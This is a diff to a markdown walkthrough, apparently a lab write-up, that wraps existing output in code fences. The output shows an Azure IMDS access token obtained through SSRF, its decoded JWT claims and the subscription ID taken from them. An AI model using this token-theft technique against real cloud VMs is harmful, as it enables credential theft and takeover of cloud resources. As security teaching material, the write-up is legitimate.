@@ -54,14 +54,14 @@ Submit the form.
 then u will be getting an output :
 
 Thank you for your submission 
-
+```json
 {
 "access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.....sDOsb3DtFKUVlOP0xx7tYnFEEkNZWtvNc1it3dv0ZlOqm4TokOfyHfEXcPx7RLayem4CxnqI9q7TYrzqUn08hLnSlGfVhhVW053VMYrkrbxef5S4zjZ3P9heyOOCLgXMI83z2w0jT82zJpm2JdYx-dZeBGN1IkZgO9UJuHCiJIfVrE7X5jy7ir9l7IPuuR8lTUQpDbYDRctLljsx_3D1xkdVt3vDA_8_W_oNI_wVNsWPtJBXSU4ijVmWKfM_yOlK9__s2UlhTwYyaRx94DPd-yh9TnvKC2ytm3sHygYs57AtGohyjb3o_OEK8EK7AR9UjfrAxI-Ay5Au7vrzOiEvzg","client_id":"ebdab26b-8a80-402c-821f-d5d203342fc2","expires_in":"86132","expires_on":"1765008628","ext_expires_in":"86399","not_before":"1764921928","resource":"https://management.azure.com/","token_type":"Bearer"
 }
 {
 "access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.....sDOsb3DtFKUVlOP0xx7tYnFEEkNZWtvNc1it3dv0ZlOqm4TokOfyHfEXcPx7RLayem4CxnqI9q7TYrzqUn08hLnSlGfVhhVW053VMYrkrbxef5S4zjZ3P9heyOOCLgXMI83z2w0jT82zJpm2JdYx-dZeBGN1IkZgO9UJuHCiJIfVrE7X5jy7ir9l7IPuuR8lTUQpDbYDRctLljsx_3D1xkdVt3vDA_8_W_oNI_wVNsWPtJBXSU4ijVmWKfM_yOlK9__s2UlhTwYyaRx94DPd-yh9TnvKC2ytm3sHygYs57AtGohyjb3o_OEK8EK7AR9UjfrAxI-Ay5Au7vrzOiEvzg","client_id":"ebdab26b-8a80-402c-821f-d5d203342fc2","expires_in":"86132","expires_on":"1765008628","ext_expires_in":"86399","not_before":"1764921928","resource":"https://management.azure.com/","token_type":"Bearer"
 }!
-
+```
 This confirms successful SSRF exploitation of **Azure IMDS**, proving access to VM metadata and tokens.
 
 ---
@@ -72,8 +72,7 @@ Next, Open jwt.io webite in your browser
 Submit the f access token.
 
 then you can see a **decoded payload**
-
-
+```json
 {
   "aud": "https://management.azure.com/",
   "iss": "https://sts.windows.net/f2a33211-e46a-4c92-b84d-aff06c2cd13f/",
@@ -99,6 +98,7 @@ then you can see a **decoded payload**
   "xms_sub_fct": "9 3",
   "xms_tcdt": 1720071254
 }
+```
 
 ![Step 3 Screenshot](./screenshots/3.png)
 
@@ -106,9 +106,9 @@ then you can see a **decoded payload**
 
 You can see the subscriptions details in the decoded payload 
 ---
-
+```json
 "xms_mirid": "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourcegroups/Default-RG/providers/Microsoft.Compute/virtualMachines/it-vm",
-
+```
 ---
 
 ![step 4 Screenshot](./screenshots/4.png)
